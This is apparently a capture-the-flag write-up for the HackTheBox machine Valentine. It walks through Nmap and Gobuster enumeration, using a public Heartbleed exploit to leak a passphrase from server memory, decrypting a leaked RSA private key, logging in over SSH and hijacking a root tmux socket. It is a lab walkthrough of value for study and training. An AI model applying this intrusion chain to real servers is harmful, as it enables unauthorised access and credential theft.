---
title: "Valentine HackTheBox Write-Up"
categories:
  - Write-Ups
---
[Valentine](https://app.hackthebox.com/machines/Valentine) is a Linux machine on HackTheBox that focuses on the Heartbleed vulnerability, which was a severe flaw in the OpenSSL cryptography library.

![](https://user-images.githubusercontent.com/85040841/155827619-5c5f37ca-3bc0-4503-b7d8-94f4f3e89bba.png)

# Scanning

Threader 3000 will quickly discover open ports on the machine, after which we can run an Nmap scan with default scripts and version detection.

```ruby
Threader 3000 - Multi-threaded Port Scanner
------------------------------------------------------------
Scanning target 10.129.1.190
------------------------------------------------------------
Port 22 is open
Port 80 is open
Port 443 is open
```

```ruby
┌──(kali㉿kali)-[~/htb/machines/valentine]
└─$ sudo nmap -Pn -n -sCV -p 22,80,443 10.129.1.190 -T4 -oN nmapSCV
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-25 02:42 EST
Nmap scan report for 10.129.1.190
Host is up (0.012s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_ssl-date: 2022-02-25T07:42:25+00:00; -1s from scanner time.
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: -1s
```

# Enumeration

Looks like there’s a web server we can access.

After adding `valentine.htb` to my `/etc/hosts` file and opening it in Firefox, this is what I was presented with:

![](https://user-images.githubusercontent.com/85040841/155691672-a7ded968-4f78-45c0-86a2-bcfda6b978a0.png)

Viewing the page source and searching for potential JavaScript files or cookies didn’t lead anywhere, so I started enumerating directories with Gobuster.

```ruby
┌──(kali㉿kali)-[~/htb/machines/valentine]
└─$ gobuster dir -u http://valentine.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 150 -o gobusterScan -x php,txt,html -fr
===============================================================
Gobuster v3.1.0
===============================================================
/dev/                 (Status: 200) [Size: 1099]
/cgi-bin/             (Status: 403) [Size: 289] 
/index/               (Status: 200) [Size: 38]  
/doc/                 (Status: 403) [Size: 285] 
/icons/               (Status: 403) [Size: 287] 
/index.php            (Status: 200) [Size: 38]  
/server-status/       (Status: 403) [Size: 295] 
/encode/              (Status: 200) [Size: 554]
/encode.php           (Status: 200) [Size: 554]
```

I’ll check out /dev/ first, given that it has the largest size.

![](https://user-images.githubusercontent.com/85040841/155691693-045f489d-291d-49f5-95ca-da2eff6a9e0e.png)

Directory indexing is enabled and we're presented with two files. I’ll download both of them to my machine.

Contents of `notes.txt` and `hype_key`, respectively:

```ruby
1) Coffee.
2) Research.
3) Fix decoder/encoder before going live.
4) Make sure encoding/decoding is only done client-side.
5) Don't use the decoder/encoder until any of this is done.
6) Find a better way to take notes.
```

![](https://user-images.githubusercontent.com/85040841/155691708-95da9ca8-0b58-4b78-95ef-faca22e7f0cd.png)

Looks like hex bytes. Decoding `hype_key` with `xxd -r -p` provides an encrypted RSA private key:

```ruby
┌──(kali㉿kali)-[~/htb/machines/valentine]
└─$ cat hype_key | xxd -r -p 
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
. . .
l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
-----END RSA PRIVATE KEY-----
```

# Exploitation

I attempted to brute-force the password for `hype_key` with ssh2john and JtR to no avail.

While doing some research, the index page of the website and name of the box provided helpful hints, per usual.

I used `searchsploit` to search for a `heartbleed` exploit, which takes advantage of an old security bug in the OpenSSL cryptography library that tricks servers into leaking information stored in their memory.

```ruby
┌──(kali㉿kali)-[~/htb/machines/valentine]
└─$ searchsploit heartbleed                                             
----------------------------------------------------------------------------------------
Exploit Title    |  Path
----------------------------------------------------------------------------------------
OpenSSL 1.0.1f TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure (Multiple SSL/TLS Versions)      | multiple/remote/32764.py
```

![](https://user-images.githubusercontent.com/85040841/155691760-3a42ec31-6018-4600-ba90-0965f5986771.png)

Quickly running the exploit revealed that the server is vulnerable!

However, we received a lot of zeroes in the output, so let’s filter them out with grep and see what we find:

![](https://user-images.githubusercontent.com/85040841/155691781-8bc83c3c-7848-401b-aca5-cb401036b288.gif)

Inside of the plaintext content on the right is a `$text` variable assigned to a base64-encoded string.

![](https://user-images.githubusercontent.com/85040841/155691816-b17d2f5a-1875-4b13-b87a-76ce0594ba3f.png)

Decoding it reveals the string “heartbleedbelievethehype.”

```ruby
┌──(kali㉿kali)-[~/htb/machines/valentine]
└─$ echo 'aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==' | base64 -d
heartbleedbelievethehype
```

Let’s try to decrypt the encrypted RSA private key we got earlier with it.

```ruby
┌──(kali㉿kali)-[~/htb/machines/valentine]
└─$ openssl rsa -in encrypted_id_rsa -out decrypted_id_rsa
Enter pass phrase for encrypted_id_rsa:
writing RSA key
```

Perfect. The password worked, and we now have a decrypted RSA private key.

```ruby
┌──(kali㉿kali)-[~/htb/machines/valentine]
└─$ cat decrypted_id_rsa 
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA1FN4mXAwn3ggiDC/N+BcdmEBf0yMl6IulSOkv9WfUrGTPTUo
cFHUa95jyaHFjme0c7hG6URWS9c4JMpB35/KUdFnOpI0MOJQlRldt+4qlpRvjEhk
. . .
vEgeEwRP/+S8UCRvLGdHrnHg6GyCEQMYNuUGtOVqNRw2ezIrpU7RybdTFN/gX+6S
tpUEwXFAuMcDkksSNTLIJC2sa7eJFpHqeajJWAc30qOO1IBlNVoehxA=
-----END RSA PRIVATE KEY-----
```

Given that the original name of the key was `hype_key`, let’s try to login to SSH on the machine with the username `hype`.

(And the `-o PubkeyAcceptedKeyTypes=+ssh-rsa` flag because I ran into errors without it.)

![](https://user-images.githubusercontent.com/85040841/155691846-4a7504e5-3a4e-4180-9646-22fdfcfb23c1.png)

And we’re in!

# User Flag

At this point, we can quickly get `user.txt` .

```ruby
hype@Valentine:~$ ls
Desktop  Documents  Downloads . . .
hype@Valentine:~$ cd Desktop/
hype@Valentine:~/Desktop$ ls
user.txt
hype@Valentine:~/Desktop$ cat user.txt 
e671************************1750
```

Displaying the kernel version with `uname -a` reveals that we’re dealing with a fairly old kernel, making it an easy path for privilege escalation.

```ruby
hype@Valentine:~/Desktop$ uname -a
Linux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
```

However, that’s low-hanging fruit, so let’s go down the creator’s intended path instead.

Through some manual enumeration, I found a `/.devs` directory that looked interesting.

```ruby
hype@Valentine:~$ cat ~/.bash_history 
exit
exot
exit
ls -la
cd /
ls -la
cd .devs
ls -la
tmux -L dev_sess 
tmux a -t dev_sess 
tmux --help
tmux -S /.devs/dev_sess 
exit
```

The .bash_history file shows that `hype` was having trouble attaching to his tmux session, so he displayed the help menu.

He eventually figured it out and executed `tmux -S` to specify the socket’s path.

We can do the same thing and instantly obtain a root session!

# Root Flag

![](https://user-images.githubusercontent.com/85040841/155691862-fae1e3e8-3424-4f20-9c66-3ded0c78ba93.gif)
